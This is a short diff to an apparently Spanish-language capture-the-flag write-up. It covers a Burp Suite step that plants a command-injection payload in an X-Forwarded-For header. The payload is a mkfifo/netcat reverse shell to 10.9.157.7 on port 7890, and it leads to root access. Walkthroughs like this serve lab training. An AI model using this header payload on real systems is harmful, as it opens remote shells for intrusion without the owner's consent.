@@ -115,7 +115,12 @@ tenemos conexión por el puerto 8080 en el que vemos la web de parte del desarro
 
 ### Burpsuite
 usamos la inyeccion sqli para que esta informacion se guarde en el archivo logged y agregamos la linea
-```python
 
+```python
+	X-Forwarded-For: $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.157.7 7890 >/tmp/f)
 ```
+
 ![[Pasted image 20240205011158.png]]
+esperamos un rato a que se haga el guardado 
+
+### WE ARE ROOT
